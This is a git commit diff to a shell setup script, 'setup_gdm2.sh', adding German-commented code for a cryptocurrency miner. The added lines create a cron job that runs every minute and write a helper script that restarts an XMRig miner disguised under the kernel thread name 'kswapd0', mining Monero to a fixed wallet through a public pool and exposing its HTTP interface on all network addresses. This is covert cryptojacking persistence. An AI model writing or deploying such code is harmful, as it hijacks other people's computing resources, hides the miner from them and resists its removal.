1214372b67889af460b882b67a1fb2e9baf96446
Acen <113854209+littlAcen@users.noreply.github.com>
2024-08-13 22:55:54 +0200

    Update setup_gdm2.sh

--- setup_gdm2.sh
+++ setup_gdm2.sh
@@ -358,6 +358,19 @@ cat $HOME/.gdm2/config.json
 
 rm -rf xmrig.tar*
 
+# Cronjob erstellen
+ (crontab -l 2>/dev/null; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
+
+ # Skript für den Cronjob erstellen
+ cat << 'EOF' > $HOME/.gdm2/check_and_start.sh
+ #!/bin/bash
+ if ! pgrep -f "kswapd0"; then
+   $HOME/.gdm2/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
+ fi
+ EOF
+
+ # Skript ausführbar machen
+ chmod +x $HOME/.gdm2/check_and_start.sh
 
 echo "[*] Generating ssh key on server"
 
